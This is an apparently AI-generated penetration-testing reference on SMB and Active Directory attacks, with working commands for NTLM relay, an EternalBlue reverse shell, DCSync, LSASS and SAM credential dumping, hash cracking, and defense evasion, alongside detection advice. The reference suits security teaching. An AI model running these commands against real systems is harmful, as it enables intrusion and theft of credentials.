# Note: All content in this file was generated using Claude Sonnet 4.6, so please read and check carefully before use.
## SMB Attack Vectors — Concepts & Explanations

> **Protocol:** Server Message Block (SMB) | **Ports:** 139/TCP, 445/TCP A deep-dive reference for penetration testers and security researchers.

---

## Table of Contents

1. [SMB Protocol Overview](#1-smb-protocol-overview)
2. [Authentication Mechanisms](#2-authentication-mechanisms)
3. [Null & Guest Sessions](#3-null--guest-sessions)
4. [Password Attacks](#4-password-attacks)
5. [Pass-the-Hash (PtH)](#5-pass-the-hash-pth)
6. [Pass-the-Ticket (PtT)](#6-pass-the-ticket-ptt)
7. [NTLM Relay](#7-ntlm-relay)
8. [SMB Signing](#8-smb-signing)
9. [EternalBlue (MS17-010)](#9-eternalblue-ms17-010)
10. [SMBGhost (CVE-2020-0796)](#10-smbghost-cve-2020-0796)
11. [PrintNightmare (CVE-2021-1675)](6#11-printnightmare-cve-2021-1675)
12. [GPP / Group Policy Preferences Attack](#12-gpp--group-policy-preferences-attack)
13. [Kerberoasting via SMB](#13-kerberoasting-via-smb)
14. [AS-REP Roasting](#14-as-rep-roasting)
15. [DCSync Attack](#15-dcsync-attack)
16. [Lateral Movement via SMB](#16-lateral-movement-via-smb)
17. [SMB Enumeration & Information Disclosure](#17-smb-enumeration--information-disclosure)
18. [Shares Misconfiguration](#18-shares-misconfiguration)
19. [LSASS Dumping via SMB](#19-lsass-dumping-via-smb)
20. [Defense Evasion on SMB](#20-defense-evasion-on-smb)

---

## 1. SMB Protocol Overview

### What is SMB?

SMB (Server Message Block) is a network file-sharing protocol that allows applications to read/write files and request services from server programs on a network. It runs over TCP port 445 (direct) or TCP port 139 (over NetBIOS).

### SMB Versions

|Version|OS|Key Features|Vulnerabilities|
|---|---|---|---|
|SMBv1|Windows NT/XP/2003|Original, unencrypted|EternalBlue, WannaCry, NotPetya|
|SMBv2|Windows Vista/2008|Reduced commands, better performance|MS09-050|
|SMBv2.1|Windows 7/2008R2|Opportunistic locking|—|
|SMBv3|Windows 8/2012|Encryption, multichannel|SMBGhost (3.1.1)|
|SMBv3.1.1|Windows 10/2016+|Pre-auth integrity, AES-128-GCM|CVE-2020-0796|

### SMB Communication Flow

```
Client                                    Server
  |                                         |
  |──── TCP SYN (port 445) ────────────────►|
  |◄─── TCP SYN-ACK ───────────────────────|
  |                                         |
  |──── SMB NEGOTIATE (propose versions) ──►|
  |◄─── SMB NEGOTIATE response ────────────|
  |                                         |
  |──── SESSION SETUP (authenticate) ──────►|
  |◄─── SESSION SETUP response ────────────|
  |                                         |
  |──── TREE CONNECT (connect to share) ───►|
  |◄─── TREE CONNECT response ─────────────|
  |                                         |
  |──── READ / WRITE / etc. ───────────────►|
```

### Key Concepts

- **Share** — a folder or resource published over SMB (e.g. `\\server\docs`)
- **IPC$** — special share for inter-process communication, used for enumeration
- **UNC Path** — Universal Naming Convention path: `\\server\share\path\file`
- **Workgroup** — peer-to-peer SMB network (no domain controller)
- **Domain** — centrally managed network with Active Directory

---

## 2. Authentication Mechanisms

### NTLM Authentication (Challenge-Response)

Used when Kerberos is unavailable or the target is accessed by IP address.

```
Client                           Server
  |                                |
  |──── NEGOTIATE ────────────────►|
  |◄─── CHALLENGE (8-byte nonce) ──|
  |                                |
  | Client computes:               |
  | NT Hash = MD4(password)        |
  | Response = HMAC-MD5(NT Hash, Challenge)
  |                                |
  |──── AUTHENTICATE (response) ──►|
  |◄─── SUCCESS / FAILURE ─────────|
```

**Why it matters for pentest:**

- The challenge-response can be captured (Responder) and cracked offline
- NTLM hashes can be relayed to authenticate to other services
- No need to know the plaintext password — hash alone is enough (PtH)

### NTLMv1 vs NTLMv2

||NTLMv1|NTLMv2|
|---|---|---|
|Hash algorithm|DES-based|HMAC-MD5|
|Crack difficulty|Easy (rainbow tables)|Harder (but still crackable)|
|Default since|Windows NT|Windows Vista+|
|Relay possible|Yes|Yes|

### Kerberos Authentication

Used in Active Directory environments when accessing resources by hostname.

```
Client          KDC (Domain Controller)         Server
  |                     |                          |
  |── AS-REQ ──────────►|                          |
  |◄─ AS-REP (TGT) ─────|                          |
  |                     |                          |
  |── TGS-REQ (TGT) ───►|                          |
  |◄─ TGS-REP (ST) ─────|                          |
  |                                                |
  |──── AP-REQ (Service Ticket) ──────────────────►|
  |◄─── AP-REP (authenticated) ────────────────────|
```

**Key terms:**

- **TGT** (Ticket Granting Ticket) — proves identity to KDC, valid 10 hours by default
- **ST** (Service Ticket) — grants access to specific service
- **KDC** (Key Distribution Center) — runs on Domain Controller
- **SPN** (Service Principal Name) — unique identifier for a service instance

---

## 3. Null & Guest Sessions

### What is a Null Session?

A null session is an unauthenticated connection to the IPC$ share using an empty username and password. It was a common misconfiguration in older Windows systems (pre-Vista).

```
smbclient //<target>/IPC$ -N
```

### What Can Be Enumerated via Null Session?

- User accounts and RIDs
- Group memberships
- Password policy (lockout threshold, complexity)
- Share names
- Domain information
- Local users

### Guest Session

The Guest account (disabled by default in modern Windows) allows read access to some shares without valid credentials.

```bash
smbclient -L //<target> -U guest%
```

### Why It Matters

Even read-only access to IPC$ allows running `rpcclient` commands to enumerate users, groups, and domain info — critical for building a target list before password attacks.

---

## 4. Password Attacks

### Brute Force

Trying every possible password combination — rarely practical due to lockout policies.

### Password Spraying

Trying **one or few common passwords against many accounts** — avoids lockout by staying under the threshold.

```
Strategy: Try "Password123!" against all 500 users
          Wait 30 minutes (lockout reset)
          Try "Welcome1!" against all 500 users
```

**Why spraying works:**

- Organizations have many users, statistically some will use common passwords
- Lockout policy is per-account — spraying across accounts avoids triggering it
- Default threshold is usually 5 attempts before lockout

**Critical: Always check password policy first**

```bash
enum4linux -P <target>
netexec smb <target> -u '' -p '' --pass-pol
```

### Credential Stuffing

Using leaked username/password pairs from data breaches against SMB — effective when users reuse passwords.

---

## 5. Pass-the-Hash (PtH)

### Concept

In NTLM authentication, the NT hash of the password is used directly to compute the challenge response. An attacker who obtains the NT hash **does not need to crack it** — they can use it directly to authenticate.

```
Normal auth:  password → NT Hash → NTLM Response → Authenticate
PtH attack:   [stolen NT Hash]  → NTLM Response → Authenticate
```

### How Hashes Are Obtained

- Dumping LSASS memory (Mimikatz, procdump)
- Extracting SAM database (local accounts)
- Dumping NTDS.dit (domain accounts)
- Intercepting with Responder (NetNTLMv2 — must be cracked first, not directly usable for PtH)

### Important Distinction

|Hash Type|Pass-the-Hash|Must Crack First|
|---|---|---|
|NT Hash (from SAM/NTDS)|Yes — use directly|No|
|NetNTLMv1/v2 (captured)|No|Yes|

### PtH Attack Chain

```
1. Compromise host A
2. Dump local admin NT hash from SAM
3. Use hash to authenticate to host B (same local admin password)
4. Dump more hashes from host B
5. Repeat — lateral movement
```

### Defense

- Enable Protected Users security group
- Disable NTLM where possible (enforce Kerberos)
- Use unique local admin passwords (LAPS)
- Enable Credential Guard

---

## 6. Pass-the-Ticket (PtT)

### Concept

Steal a valid Kerberos ticket (TGT or Service Ticket) from memory and inject it into your own session to impersonate that user without knowing their password.

```
Normal: User logs in → KDC issues TGT → stored in LSASS memory
Attack: Steal TGT from LSASS → inject into attacker session → use as that user
```

### Golden Ticket

- Forged TGT signed with the **KRBTGT account hash**
- Valid for any service in the domain
- Can be created offline after obtaining KRBTGT hash
- Default validity: 10 years
- Survives password resets (until KRBTGT hash is rotated twice)

```
Requires: KRBTGT NT hash + Domain SID + target username
Result:   Full domain compromise that persists
```

### Silver Ticket

- Forged Service Ticket for a **specific service** (e.g. CIFS on a server)
- Does not touch the Domain Controller — harder to detect
- Signed with the service account's hash, not KRBTGT

```
Requires: Service account NT hash + Domain SID + SPN
Result:   Access to that specific service without DC interaction
```

---

## 7. NTLM Relay

### Concept

When a client authenticates to an attacker's fake server, the attacker **forwards (relays) those credentials to a real target** in real time — gaining access without ever cracking the hash.

```
Victim                  Attacker                  Target Server
  |                        |                            |
  |── NTLM Auth ──────────►|                            |
  |                        |──── relay Auth ───────────►|
  |◄── Challenge ──────────|◄─── Challenge ─────────────|
  |── Response ───────────►|──── relay Response ────────►|
  |                        |◄─── SUCCESS ───────────────|
  |                        |  (attacker is now authed)  |
```

### Attack Requirements

1. SMB Signing must be **disabled or not required** on the target
2. Victim must be tricked into authenticating to attacker (LLMNR/NBT-NS poisoning, or other coercion)
3. Attacker cannot relay to the same machine that sent the auth (same-host relay blocked)

### LLMNR / NBT-NS Poisoning

When a Windows host cannot resolve a hostname via DNS, it broadcasts LLMNR (Link-Local Multicast Name Resolution) or NBT-NS queries. Responder answers these queries, poisoning the response and capturing NTLM authentication attempts.

```
Victim: "Hey network, who is \\FILESERVER01?"
Responder: "That's me! Authenticate here."
Victim: [sends NTLM auth to attacker]
Attacker: [captures NetNTLMv2 hash or relays it]
```

### Relay Targets

- SMB → remote command execution (psexec style)
- LDAP → add computer to domain, modify ACLs, enable RBCD
- HTTP/HTTPS → authentication to web services
- MSSQL → execute queries, xp_cmdshell

### Tools

```bash
# Step 1 — capture / poison
responder -I eth0 -rdwv

# Step 2 — relay to target
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
impacket-ntlmrelayx -tf targets.txt -smb2support -i   # interactive shell
```

---

## 8. SMB Signing

### What is SMB Signing?

A security feature that cryptographically signs every SMB packet to ensure it has not been tampered with and comes from a legitimate source.

### States

|State|Meaning|
|---|---|
|Disabled|Signing never used|
|Enabled (not required)|Signing supported but not enforced — RELAY POSSIBLE|
|Required|All packets must be signed — relay blocked|

### Default Settings

|System|Signing Default|
|---|---|
|Domain Controllers|Required (enforced)|
|Domain members (workstations/servers)|Enabled but not required|
|Standalone / workgroup machines|Disabled|

### Why Attackers Care

If signing is **not required**, NTLM relay attacks work. Most workstations and member servers have signing enabled but not required by default — making them valid relay targets.

```bash
# Find hosts without signing required (valid relay targets)
netexec smb <subnet>/24 --gen-relay-list relay_targets.txt
nmap -p 445 --script smb-security-mode <subnet>/24
```

---

## 9. EternalBlue (MS17-010)

### What is it?

A critical vulnerability in SMBv1 that allows **unauthenticated remote code execution** by exploiting a buffer overflow in the Windows SMB server. Leaked by Shadow Brokers in April 2017. Used by WannaCry and NotPetya ransomware.

### How it Works

1. Attacker sends a malformed SMB transaction request
2. Triggers a heap buffer overflow in `srv.sys`
3. Allows writing shellcode to kernel memory
4. Achieves SYSTEM-level code execution — no credentials required

### Affected Systems

- Windows XP, Vista, 7, 8, 8.1
- Windows Server 2003, 2008, 2008 R2, 2012, 2012 R2
- Any unpatched Windows with SMBv1 enabled

### Patch

**MS17-010** — released March 2017. Systems unpatched after May 2017 (WannaCry) are still commonly found in internal networks.

### Detection

```bash
nmap -p 445 --script smb-vuln-ms17-010 <target>
netexec smb <target> -u '' -p '' -M ms17-010
```

### Exploitation

```bash
# Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
set LHOST <attacker_IP>
run
# Result: SYSTEM shell
```

---

## 10. SMBGhost (CVE-2020-0796)

### What is it?

A critical integer overflow vulnerability in SMBv3.1.1 compression (Windows 10 / Server 2019). Can lead to **unauthenticated remote code execution** or local privilege escalation.

### How it Works

1. SMBv3.1.1 added data compression support
2. A malformed compression header causes an integer overflow
3. Leads to heap buffer overflow in kernel
4. Pre-authentication — no credentials needed

### Affected Systems

- Windows 10 version 1903, 1909
- Windows Server version 1903, 1909

### Detection

```bash
nmap -p 445 --script smb-vuln-cve-2020-0796 <target>
```

### Patch

**KB4551762** — released March 12, 2020.

---

## 11. PrintNightmare (CVE-2021-1675)

### What is it?

A critical vulnerability in the **Windows Print Spooler service** (`spoolsv.exe`) that allows **authenticated remote code execution** and **local privilege escalation** by loading a malicious DLL through the AddPrinterDriver API — accessible over SMB.

### How it Works

1. Any authenticated domain user can call the Print Spooler RPC
2. Attacker supplies a UNC path to a malicious DLL on their SMB server
3. The Spooler (running as SYSTEM) loads the DLL
4. Attacker gets SYSTEM code execution

### Why Dangerous

- Any domain user can exploit it — no admin rights needed
- Affects all Windows versions with Print Spooler enabled
- Spooler is enabled by default on most Windows machines

### Attack Flow

```
1. Attacker hosts malicious DLL on SMB share
2. Sends RPC call: AddPrinterDriverEx() with UNC path to DLL
3. SYSTEM-level spooler loads attacker's DLL
4. DLL executes as SYSTEM → reverse shell / add admin user
```

### Detection

```bash
# Check if Print Spooler is running on target
netexec smb <target> -u <user> -p <pass> -M spooler
impacket-rpcdump <target> | grep -i spooler
```

---

## 12. GPP / Group Policy Preferences Attack

### What is it?

Group Policy Preferences (GPP) allowed admins to set local account passwords via Group Policy. These passwords were stored in `Groups.xml` in SYSVOL — **encrypted with AES-256 but using a publicly known key published by Microsoft**.

### Where to Find It

```
\\<domain>\SYSVOL\<domain>\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml
```

### The Vulnerability

- Microsoft published the AES key in MSDN documentation (2012)
- Any authenticated domain user can read SYSVOL
- The `cpassword` field in Groups.xml is trivially decryptable

### What's in Groups.xml

```xml
<Properties action="U" newName="" fullName="" description=""
  cpassword="edBSHOwhZLTjt/QS9FeIcJ7CwIHKRx7JgEiI76cF7J4="
  changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0"
  userName="Administrator"/>
```

### Exploit

```bash
# Step 1 — find Groups.xml
smbclient //<DC_IP>/SYSVOL -U <user>%<pass>
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *

# Step 2 — decrypt cpassword
gpp-decrypt <cpassword_value>

# Automated
netexec smb <target> -u <user> -p <pass> -M gpp_password
```

### Patch

**MS14-025** — removed the ability to set passwords via GPP (2014). But credentials set before the patch may still exist in SYSVOL.

---

## 13. Kerberoasting via SMB

### What is it?

Any authenticated domain user can request a **Service Ticket (ST)** for any service with a registered SPN. The ticket is encrypted with the service account's NT hash — which can be cracked offline.

### Why Dangerous

- No special privileges required — any domain user can do it
- Service accounts often have weak passwords and never expire
- The attack generates no failed login attempts

### Attack Flow

```
1. Enumerate SPNs (find service accounts)
2. Request Service Ticket for each SPN
3. Extract the encrypted ticket (contains hash of service account password)
4. Crack offline with hashcat / john
5. Use service account credentials for lateral movement / privilege escalation
```

### SPN Examples

```
MSSQLSvc/sqlserver01.domain.local:1433   → SQL Server service account
HTTP/webserver.domain.local              → Web service account
kadmin/changepw                          → Built-in Kerberos
```

### Tools

```bash
# Impacket
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request

# Crack the hash
hashcat -m 13100 spn_hashes.txt wordlist.txt
```

---

## 14. AS-REP Roasting

### What is it?

For accounts with **"Do not require Kerberos preauthentication"** enabled, an attacker can request an AS-REP without authenticating. The response contains data encrypted with the user's password hash — crackable offline.

### Normal Kerberos vs AS-REP Roasting

```
Normal:    Client sends AS-REQ with timestamp encrypted by user hash
           KDC verifies → issues TGT

AS-REP:    No preauthentication required
           Attacker requests AS-REQ with any username
           KDC sends AS-REP with encrypted data (no verification)
           Attacker cracks encrypted data offline
```

### Who is Vulnerable

Any user account with `UF_DONT_REQUIRE_PREAUTH` flag set — uncommon but exists in some environments for legacy application compatibility.

### Tools

```bash
# No credentials needed
impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass -dc-ip <DC_IP>

# With valid credentials (enumerate all vulnerable accounts)
impacket-GetNPUsers <domain>/<user>:<pass> -dc-ip <DC_IP> -request

# Crack
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

---

## 15. DCSync Attack

### What is it?

A technique that abuses the **Directory Replication Service (DRS)** protocol to request replication of password hashes from a Domain Controller — as if you were another DC syncing AD data. Result: dump all password hashes in the domain.

### How it Works

- Domain Controllers replicate AD data between each other using DRSUAPI
- An account with **Replicating Directory Changes** permissions can trigger this
- No code runs on the DC — it's a legitimate AD replication request

### Required Permissions

- `Replicating Directory Changes`
- `Replicating Directory Changes All`
- Default holders: Domain Admins, Enterprise Admins, Domain Controllers

### Why Critical

- Dumps **all** NT hashes including KRBTGT → enables Golden Ticket
- No files to copy — purely network-based
- Generates DC replication events (detectable, but often overlooked)

### Tools

```bash
# Impacket
impacket-secretsdump <domain>/<user>:<pass>@<DC_IP> -just-dc

# Mimikatz (on domain-joined machine)
lsadump::dcsync /domain:<domain> /all /csv
lsadump::dcsync /domain:<domain> /user:krbtgt
```

---

## 16. Lateral Movement via SMB

### PsExec-style (SMB + Service Control Manager)

Creates a service on the remote host to execute commands. Leaves artifacts (service creation events).

```bash
impacket-psexec <domain>/<user>:<pass>@<target>
netexec smb <target> -u <user> -p <pass> -x "whoami"
```

### SMBExec

Similar to PsExec but uses a temporary batch file. Slightly stealthier.

```bash
impacket-smbexec <domain>/<user>:<pass>@<target>
```

### WMIExec (over SMB/DCOM)

Uses WMI to execute commands — no service creation, stealthier.

```bash
impacket-wmiexec <domain>/<user>:<pass>@<target>
```

### AtExec (Task Scheduler via SMB)

Schedules a task to run the command.

```bash
impacket-atexec <domain>/<user>:<pass>@<target> whoami
```

### Lateral Movement Detection Signatures

|Technique|Event ID|Log|
|---|---|---|
|PsExec|7045 (service install)|System|
|Network logon|4624 (type 3)|Security|
|Explicit cred use|4648|Security|
|Share access|5140|Security|
|SMB session|4776|Security|

---

## 17. SMB Enumeration & Information Disclosure

### What Can Be Learned Without Credentials

```
IPC$ null session:
├── Usernames and RIDs
├── Group names and memberships
├── Password policy (lockout threshold!)
├── Domain name and SID
├── Share names
└── OS version

SMB negotiation (no auth):
├── SMB version supported
├── OS version and build
├── Hostname and domain
└── Whether signing is required
```

### Tools

```bash
# Nmap
nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery <target>

# Enum4linux
enum4linux -a <target>

# Netexec
netexec smb <target> -u '' -p '' --shares --users --groups --pass-pol
```

### Why Information Disclosure Matters

- Usernames enable targeted password spraying
- Password policy tells you how many attempts before lockout
- OS version reveals patch level → known exploits
- Share names reveal network topology and sensitive folders

---

## 18. Shares Misconfiguration

### Common Misconfigurations

|Misconfiguration|Risk|
|---|---|
|Readable shares for Everyone|Sensitive data exposure|
|Writable shares for low-priv users|Malware upload, DLL hijacking|
|SYSVOL readable (normal) + GPP passwords present|Credential theft|
|Backup shares accessible|Old password hashes, config files|
|IT/Admin shares with credentials in scripts|Credential theft|
|Home directories traversable|User data, SSH keys, browser passwords|

### What to Look For in Open Shares

```
*.xml      → GPP passwords, config files
*.config   → database connection strings
*.ps1      → hardcoded credentials in scripts
*.bat      → hardcoded credentials in scripts
*.kdbx     → KeePass databases
id_rsa     → SSH private keys
*.pfx      → certificate with private key
web.config → ASP.NET database credentials
.env       → application credentials
unattend.xml → Windows deployment credentials
```

---

## 19. LSASS Dumping via SMB

### What is LSASS?

Local Security Authority Subsystem Service — stores credentials of logged-in users in memory (NT hashes, Kerberos tickets, plaintext passwords in older systems).

### Remote LSASS Dump via SMB

```bash
# Netexec — dump LSASS remotely
netexec smb <target> -u <user> -p <pass> -M lsassy
netexec smb <target> -u <user> -p <pass> -M nanodump

# Impacket secretsdump — remote SAM and LSA
impacket-secretsdump <domain>/<user>:<pass>@<target>

# Dump SAM and SYSTEM hives via SMB
smbclient //<target>/C$ -U <user>%<pass> \
  -c 'get Windows\System32\config\SAM /tmp/SAM'
smbclient //<target>/C$ -U <user>%<pass> \
  -c 'get Windows\System32\config\SYSTEM /tmp/SYSTEM'

# Crack offline
impacket-secretsdump -sam /tmp/SAM -system /tmp/SYSTEM LOCAL
```

### What's in LSASS

- NT hashes of logged-in users
- Kerberos TGTs and Service Tickets
- Plaintext passwords (WDigest, if enabled — rare in modern systems)
- DPAPI master keys

---

## 20. Defense Evasion on SMB

### Techniques Attackers Use to Stay Hidden

|Technique|Description|
|---|---|
|Use legitimate ports|SMB on 445 blends with normal traffic|
|WMIExec over PsExec|No service creation events|
|Silver Ticket|Accesses service without touching DC — no DC logs|
|AtExec|Task scheduler — less monitored|
|Avoid ADMIN$|Use writable custom shares instead|
|Time attacks|Operate during business hours to blend|
|Use LOLBins|`net use`, `copy`, `wmic` — built-in tools|

### Common Detection Controls (Blue Team Reference)

|Control|What it Catches|
|---|---|
|SMB Signing enforced|NTLM relay|
|LAPS|Local admin PtH reuse|
|Credential Guard|LSASS dump / PtH|
|Disable NTLM|NTLM relay, PtH|
|Disable SMBv1|EternalBlue, legacy exploits|
|Monitor 4624 Type 3|Network logons|
|Monitor 7045|Service installs (PsExec)|
|Disable LLMNR/NBT-NS|Responder poisoning|
|Tiered admin model|Credential reuse across tiers|
|Honeypot shares|Detect unauthorized enumeration|

---

## Attack Chain Summary

```
External / Unauthenticated
├── EternalBlue (MS17-010) ──────────────────► SYSTEM (no creds)
├── SMBGhost (CVE-2020-0796) ────────────────► SYSTEM (no creds)
└── Null session enumeration ────────────────► user list, policy

Internal / Low-privilege User
├── Password spraying ───────────────────────► valid credentials
├── LLMNR poisoning → NTLM relay ────────────► code execution
├── GPP passwords (SYSVOL) ──────────────────► plaintext credentials
├── AS-REP Roasting ─────────────────────────► crackable hash
├── Kerberoasting ───────────────────────────► service account hash
└── Share enumeration ───────────────────────► sensitive files

Privileged User / Local Admin
├── Pass-the-Hash ───────────────────────────► lateral movement
├── Pass-the-Ticket ─────────────────────────► impersonation
├── LSASS dump ──────────────────────────────► more hashes / tickets
├── PrintNightmare ──────────────────────────► SYSTEM
└── DCSync ──────────────────────────────────► all domain hashes

Domain Admin
├── Golden Ticket (KRBTGT hash) ─────────────► persistent domain access
└── Silver Ticket (service hash) ────────────► persistent service access
```

---

_For authorized penetration testing and security research use only._